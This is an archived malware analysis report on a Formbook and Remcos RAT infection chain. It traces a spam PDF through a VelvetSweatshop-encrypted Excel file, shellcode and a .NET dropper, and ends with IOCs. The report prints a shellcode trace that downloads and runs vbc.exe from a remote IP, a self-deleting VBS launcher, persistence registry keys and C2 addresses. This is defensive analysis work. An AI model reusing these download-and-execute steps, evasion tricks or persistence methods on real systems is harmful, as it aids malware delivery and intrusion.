{
    "id": "7e7e56cf-1939-4f13-8110-c073943dc8d9",
    "created_at": "2023-01-12T14:58:57.133497Z",
    "updated_at": "2025-03-27T02:05:31.055658Z",
    "deleted_at": null,
    "sha1_hash": "aa33d6f4c5237ee2ee44f048e67ad79a02fd2e02",
    "title": "2022-08-04 - Formbook and Remcos Backdoor RAT by ConnectWise CRU",
    "authors": "",
    "file_creation_date": "2022-08-18T03:54:40Z",
    "file_modification_date": "2022-08-18T03:54:40Z",
    "file_size": 760817,
    "plain_text": "# Formbook and Remcos Backdoor RAT\n\n**connectwise.com/resources/formbook-remcos-rat**\n\nAugust 4, 2022 by Stu Gonzalez\n\nTools\n\n0x01 Document Analysis (19Jun22 ARR Safari.pdf)\n\n0x02 Analysis of Dropped File (vbc.exe)\n\n0x03 Analysis of DLL (Periodicity.dll)\n\n0x04 Dynamic Analysis\n\nVBS script\n\nRegistry\n\niys.exe\n\n0x05 Additional Findings\n\n0x06 IOCs\n\n0x07 Upload\n\n0x08 References\n\n## Tools\n\nThe following tools were used during this analysis:\n\npdf-parser.py\n\nzlib-flate\n\nmsoffcrypto-tool\n\noletools\n\noledump.py\n\nxorsearch\n\nscdbg\n\nDnSpy\n\n## 0x01 Document Analysis (19Jun22 ARR Safari.pdf)\n\nWhilst enjoying a refreshing orange Fanta this weekend. I figured I would check out the ole spam trap.\n\nI received 8 emails containing the same file.\n\nAfter downloading the .eml files, I checked to see if there was any difference between the attachments in the emails.\nThey were all showing the same hash for all emails received.\n\n\n-----\n\nTime to extract the pdf 19Jun22 ARR Safari.pdf from the email by copying the base64 string and decoding it into a new\npdf file.\n\nUsing _[pdf-parser.py (by Didier Stevens) to inspect the pdf and find interesting components of this suspicious document.](https://github.com/DidierStevens/DidierStevensSuite/blob/master/pdf-parser.py)_\n```\n$ pdf-parser.py 19Jun22\\ ARR\\ Safari.pdf -O -a\n\nComment: 3\n\nXREF: 0\n\nTrailer: 0\n\nStartXref: 1\n\nIndirect object: 47\n\n  27: 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 3, 6, 8, 10, 11, 25, 27, 28, 29, 38, 40, 42, 44, 46\n\n /Action 1: 7\n\n /Catalog 1: 2\n\n /EmbeddedFile 1: 37\n\n /Filespec 1: 26\n\n /Font 1: 30\n\n /ObjStm 1: 1\n\n /Outlines 1: 4\n\n /Page 1: 9\n\n /Pages 1: 5\n\n /XObject 10: 31, 32, 33, 34, 35, 36, 39, 41, 43, 45\n\n /XRef 1: 47\n\nSearch keywords:\n\n /JS 1: 7\n\n /JavaScript 1: 7\n\n /OpenAction 1: 2\n\n /AcroForm 1: 2\n\n /EmbeddedFile 1: 37\n\n```\nThe /Javascript and /EmbeddedFile looked interesting and worth further investigation.\n\nThe /Javascript object did not contain anything of value, but the /EmbeddedFile, on the other hand, appeared to be a\ndecent chunk in size.\n```\n$ pdf-parser.py 19Jun22\\ ARR\\ Safari.pdf -O -o 37 -d safari.compressed\n\n> obj 37 0\n\n> Type: /EmbeddedFile\n\n> Referencing:\n\n> Contains stream\n\n>\n\n> <<\n\n> /Filter /FlateDecode\n\n> /Type /EmbeddedFile\n\n> /Length 48959\n\n> >>\n\n```\nUsing pdf-parser.py, I was able to extract the embedded file from the PDF\n```\n$ file safari.compressed\n\n> embedded_file: zlib compressed data\n\n```\nCome to find out that the file was compressed, so I used zlib -flate -uncompress to decompress\n```\n$ zlib-flate -uncompress < safari.compressed > safari.encrypted\n\n```\n[Checking the file again to discover the file was CDFV2 Encrypted .](https://en.wikipedia.org/wiki/Compound_File_Binary_Format)\n```\n$ file safari.raw\n\n> safari_pdf_embedded_file.encrypted: CDFV2 Encrypted\n\n```\nAfter some searching to figure out what could the password possibly be, I solidified the notion that this was Formbook\n[and thanks to this article I was able to confirm it was VelvetSweatshop. Additionally, the password was a default](https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/)\nMicrosoft password, VelvetSweatshop.\n\n\n-----\n\n_VelvetSweatshop is a default key stored in Microsoft Excel program code for decryption. It s a neat trick that attackers_\ncan leverage to encrypt malicious Excel files in order to evade static-analysis-based detection systems, while\neliminating the need for a potential victim to enter a password.\n\n[In order to decrypt, I was able to use msoffcrypto-tool to decrypt the file.](https://github.com/nolze/msoffcrypto-tool)\n```\n$ msoffcrypto-tool safari.encrypted safari.decrypted -p VelvetSweatshop\n\n```\nChecking the decrypted file, the final format is an Excel document.\n```\n$ file safari.decrypted\n\n> safari.decrypted: Microsoft Excel 2007+\n\n```\nAs with most MS documents, it was curious to check for any macros.\n```\n$ olevba safari.decrypted\n\nolevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools\n\n===============================================================================\n\nFILE: safari.decrypted\n\nType: OpenXML\n\nNo VBA or XLM macros found.\n\n```\n_[Oletools yielded no interesting or actionable information.](https://github.com/decalage2/oletools)_\n\nNext I chose, _[oledump.py (by Didier Stevens) and used it to check for ole objects.](https://blog.didierstevens.com/programs/oledump-py/)_\n```\n$ oledump.py safari.decrypted\n\nA: xl/embeddings/oleObject1.bin\n\n A1: 20 '\\x01Ole'\n\n A2: 1721 '\\x01Ole10NAtivE'\n\n```\nAn OLE object in the spreadsheet that doesn’t contain macro code, could possibly mean it’s shellcode. Since A2 stream\nlooks larger, let’s extract and see if xorsearch -W can help us find an entry point.\n\nLet’s extract the code with oledump.py.\n```\n$ oledump.py -d -s A2 safari.decrypted > shellcode.data\n\n```\n[Now we want to search with xorsearch.](https://blog.didierstevens.com/programs/xorsearch/)\n```\n$ xorsearch -W shellcode.data\n\nFound XOR 00 position 0000024D: GetEIP method 3 E99C000000\n\nFound ROT 25 position 0000024D: GetEIP method 3 E99C000000\n\nFound ROT 24 position 0000024D: GetEIP method 3 E99C000000\n\nFound ROT 23 position 0000024D: GetEIP method 3 E99C000000\n\nFound ROT 22 position 0000024D: GetEIP method 3 E99C000000\n\nFound ROT 21 position 0000024D: GetEIP method 3 E99C000000\n\n...\n\n```\n_xorsearch found a GetEIP method at 0x24D in the A2 stream we exported. We can use this offset with scdbg to_\nemulate the shellcode execution.\n\nSelect our shellcode file (shellcode.data) and select the options listed below before launching.\n\n\n-----\n\nOutput from running scdbg.\n\n\n-----\n\n```\n4014c4 GetProcAddress(ExpandEnvironmentStringsW)\n\n4014f7 ExpandEnvironmentStringsW(%PUBLIC%\\vbc.exe, dst=12fbd8, sz=104)\n\n40150c LoadLibraryW(UrlMon)\n\n401527 GetProcAddress(URLDownloadToFileW)\n\n40157f URLDownloadToFileW(http://185.239.243.122/421/vbc.exe, C:\\Users\\Public\\vbc.exe)\n\n401596 LoadLibraryW(shell32)\n\n4015ac GetProcAddress(ShellExecuteW)\n\n4015bb unhooked call to shell32.ShellExecuteW step=40468\n\n```\nIn the shellcode, the adversary uses ExpandEnvironmentStringsW to find the Public folder in Windows. Next, they use\n_URLDownloadToFileW to retrieve content from hxxp://185.239.243.122/421/vbc.exe and write it to_\n_C:\\Users\\Public\\vbc.exe. Finally, they use ShellExecuteExW to launch vbc.exe._\n\nThe endpoint was still live and delivering the payload. So I grabbed the executable to begin Identifying what vbc.exe\ncould be.\n\n## 0x02 Analysis of Dropped File (vbc.exe)\n```\n$ file vbc.exe\n\nvbc.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows\n\n```\nAs you can see vbc.exe, is compiled in .Net. I will open vbc.exe in DnSpy on my VM.\n\n\n-----\n\nAfter opening the the executable in DnSpy, I found that the functions were encoded and I could only assume there were\nso other parts of the executable that were obfuscated. For easy of reading, I chose to run the De4dot against the the\nexecutable to clean it up a bit.\n\nThats better!\n\nStepping in to execution, I ran across a byte array called, <<EMPTY_NAME>> .\n\nThe byte array, <<EMPTY_NAME>>, is then load with the contents from Documents._22.\n\n\n-----\n\nThen a MemoryStream variable called memoryStream and loads <<EMPTY_NAME>> byte array.\n\nNext a GZipStream variable called, gzipStream, decompress the contents of memoryStream and stores it in itself.\n\nLastly, a second MemoryStream called, memoryStream2, copies and coverts the decompressed contents\nof gzipStream into memoryStream2.\n\nAfter copying the stream, I can see a PE magic number (0x4D5A) in the _buffer byte array.\n\nWhat is this binary file?!\n\nLet’s dump and save it for later to analyze.\n\nRight click on the _buffer variable → Show in Memory Window → Memory 1.\n\nI am then shown the Memory Window and my binary file is already highlighted and selected.\n\nRight click → Save Selection → save as dump.exe\n\nAfter saving the binary, I checked the meta data of the file and I can see it is a .Net DLL called Periodicity.dll.\n\n\n-----\n\nOk now that I have that saved, I head back to check and see what comes next with my memoryStream2 buffer.\n\nThe variable memoryStream2 is then passed to function that simply calls for System.Reflection.Assembly and loads the\nbinary into memory.\n\nThe pointer to the handle of the binary loaded into memory now resides in the assembly_ variable.\n\nNext time we see the assembly_ variable, the process is attempting to retrieve public types defined in the assembly that\nare visible outside the assembly.\n\nThe returned data shows the Module, Name, and Namespace of the exported type.\n\nNext, I found the function, MyPoint() set an array variable with 3 values, that will later be used as arguments for the DLL\nthat was loaded into memory.\n```\n\"506C6174666F726D4E6F74537570706F72746564457863657074\"\n\n\"4C37554D\"\n\n\"PolicyLevel\"\n\n```\nStepping through, I came across the last function that calls the Activator.CreateInstance module and supplies the\nparameters of the exported type variable (_type) and the array of parameters I mentioned.\n\n\n-----\n\nAfter running this last function, the execution of vbc.exe within DnSpy terminates and a new process begins running by\nthe name of iys.exe. This instance is running is running from %AppData%/Roaming directory.\n\n## 0x03 Analysis of DLL (Periodicity.dll)\n\nExecuting .NET dll, Periodicity.dll, via [SharpDllLoader, with the parameters I found earlier in my analysis of vbc.exe.](https://github.com/hexfati/SharpDllLoader)\n```\nExecutable: C:\\Users\\IEUser\\Downloads\\SharpDllLoader-master\\SharpDllLoader\\bin\\Release\\SharpDllLoader.exe\n\nArguments: -d \"C:\\Users\\IEUser\\Desktop\\dump.dll\" -c CPeriodCollection -m .ctor -a\n\"506C6174666F726D4E6F7453757070 6F72746564457863657074 4C37554D PolicyLevel\"\n\nWorking Directory: <path to sharpdllloader>\n\nBreak At: Entry Point\n\n```\nThis did not work as I thought it would. I am not sure how I am suppose to load this DLL to analyze it but I will read\nmore into the process and hopefully can analyze in the future.\n\n## 0x04 Dynamic Analysis\n\nLet’s execute the vbc.exe on my sandbox and have Process Hacker, ProcMon, and Wireshark running to capture all the\nfun bits.\n\nI set my ProcMon filter to watch for what I know so far, the process names vbc.exe and iys.exe.\n\nWireshark will just be listening all traffic on my network interface.\n\nI let this run for several minutes to make sure I wasn’t missing any delayed executions or networks calls.\n\n\n-----\n\nI was able to find file drops to %AppData% directory, registry entries, and network activity.\n\n### VBS script\n\nVBS script is written to the Temp Folder. Then promptly executed vbc.exe using wscript.exe.\n```\nC:\\Windows\\System32\\WScript.exe C:\\Users\\IEUser\\AppData\\Local\\Temp\\install.vbs\n\n```\nThe VBS script appeared to have a self delete component.\n\nI used the following Powershell to copy the VBS script before it was deleted.\n```\nwhile (!(Test-Path \"C:\\Users\\IEUser\\AppData\\Local\\Temp\\install.vbs\")) {}; Copy-Item\n\"C:\\Users\\IEUser\\AppData\\Local\\Temp\\install.vbs\" \"C:\\Users\\IEUser\\Desktop\\install.vbs\"\n\n```\nContents of the install.vbs\n```\nWScript.Sleep 1000\n\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\n\nCreateObject(\"WScript.Shell\").Run \"cmd /c \"\"C:\\Users\\IEUser\\AppData\\Roaming\\iys.exe\"\"\", 0\n\nfso.DeleteFile(Wscript.ScriptFullName)\n\n### Registry\n\n```\nRegistry set HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Notifications\\Data\\418A073AA3BC3475\ncontains binary data. The data look very similar to the unstructured DLL binary array that was loaded into\nMemoryStream from earlier during our code analysis of vbc.exe.\n\nRegistry set HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\gtr contains the path to\nthe C:\\Users\\IEUser\\AppData\\Roaming\\iys.exe to execute upon every startup (Persistence).\n\nLastly, two entries under HKCU\\Software\\Remcos-KO7WBT that match known Remcos RAT registry entries structure.\n\n\n-----\n\n```\nexepath: 9c d6 73 bf e5 0f be a9 5e 14 57 ab f4 aa 59 ec 19 64 9d 8b 9e 09 91 99 e5 e3 1e ee 0c db da cb 05 57\ndb\nea 8a 65 74 f8 0a 1e 28 9b 42 d8 22 fe 35 01 71 d1 e3 64 74 53 6a 11 af 27 66 18 d5 7a 7f 21 46 1c 14 5b c4 57\nac\ne0 f5 8b da 83 4d af\n\nlicence: d75ea3de2ad117e4485816ef2a4a46f1\n\n### iys.exe\n\n```\nNew file written to %AppData%\\Roaming\\iys.exe.\n\n_iys.exe hash matches vbc.exe._\n\n_iys.exe uses C:\\Users\\IEUser\\AppData\\Roaming\\logs.dat as way to log information. Likely related to its C2 activity._\n\n_iys.exe was seen making network connections out to 62.197.136.86 over port 3091 and 178.237.33.50 over port 80._\n\n## 0x05 Additional Findings\n\nI found an interesting choice in icon images stored in the Resources of the executable. Reverse image search of the\nicon turned out to be the National Emblem of Indonesia, Symbol Garuda Pancasila.\n\n## 0x06 IOCs\n\nHash Filename\n\nd1c2cc0ca653df8ddb46c1337a5972eaceb81ea924e8ebdb7af0699a7ab909fd 19Jun22 ARR Safari.pdf\n\n5d17b63fe99f0608c79129a296bba3af7c8dcfe17913f93ce67dbda376f6987c safari_pdf_embedded_file.compressed\n\n25672487eb5df23ce72e6ea101ef4047c1407cb0dcb25e59486f125763a9f69d safari_pdf_embedded_file.encrypted\n\n\n-----\n\ne1192a47786ea37fd75864d7b8b9a049b4ab72bad852b052318f863713bc97d7 safari_pdf_embedded_file.decrypted\n\ndac51b15136081c2540d2c4c16372668e5e54c89d233e8b30faaabf7c901bc84 vbc.exe\n\n490a432a796c670a8eb7b93ee1710eb023ab12fcebc7a7225c4d7b030330abb8 shellcode.data\n\nIP\n\nhxxp://185.239.243.122/421/vbc.exe Dropper\n\n62.197.136.86:3091 C2\n\n178.237.33.50:80 GeoIP Location\n\nFiles\n\nC:\\Users\\Public\\vbc.exe Dropped File Path\n\n%AppData%\\Local\\Temp\\install.vbs VBS script\n\n%AppData%\\Roaming\\iys.exe C2 Log File\n\n%AppData%\\Roaming\\iys.exe Persistence RAT Path\n\nRegistry\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\gtr %AppData%\\Roaming\\iys.exe\n\nHKCU\\Software\\Remcos-KO7WBT\\exepath Data: 9C D6 73 BF E5 0F BE A9 5E 14 57\nAB F4 AA 59 EC\n\nHKCU\\Software\\Remcos-KO7WBT\\licence Data:\nD75EA3DE2AD117E4485816EF2A4A46F1\n\n\nHKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Notifications\\Data\\418A073AA3BC3475\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ZoneMap\\ProxyBypass\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ZoneMap\\IntranetName\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ZoneMap\\UNCAsIntranet\n\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ZoneMap\\AutoDetect\n\n\nBinary data\n\n1\n\n1\n\n1\n\n0\n\n\n-----\n\n## 0x07 Upload\n\n[https://www.filescan.io/uploads/62aecf127046ab63f87d6f0c/reports/40faed10-37d6-4273-8c8fb58fcfcd676a/overview](https://www.filescan.io/uploads/62aecf127046ab63f87d6f0c/reports/40faed10-37d6-4273-8c8fb58fcfcd676a/overview)\n\n[https://bazaar.abuse.ch/sample/d1c2cc0ca653df8ddb46c1337a5972eaceb81ea924e8ebdb7af0699a7ab909fd/](https://bazaar.abuse.ch/sample/d1c2cc0ca653df8ddb46c1337a5972eaceb81ea924e8ebdb7af0699a7ab909fd/)\n\n## 0x08 References\n\n[https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/](https://forensicitguy.github.io/xloader-formbook-velvetsweatshop-spreadsheet/)\n\n[https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/backdoor.win32.remcos.usmaneaggk/](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/backdoor.win32.remcos.usmaneaggk/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-08-04 - Formbook and Remcos Backdoor RAT by ConnectWise CRU.pdf"
    ],
    "report_names": [
        "2022-08-04 - Formbook and Remcos Backdoor RAT by ConnectWise CRU.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535537,
    "ts_updated_at": 1743041131,
    "ts_creation_date": 1660794880,
    "ts_modification_date": 1660794880,
    "files": {
        "pdf": "https://archive.orkl.eu/aa33d6f4c5237ee2ee44f048e67ad79a02fd2e02.pdf",
        "text": "https://archive.orkl.eu/aa33d6f4c5237ee2ee44f048e67ad79a02fd2e02.txt",
        "img": "https://archive.orkl.eu/aa33d6f4c5237ee2ee44f048e67ad79a02fd2e02.jpg"
    }
}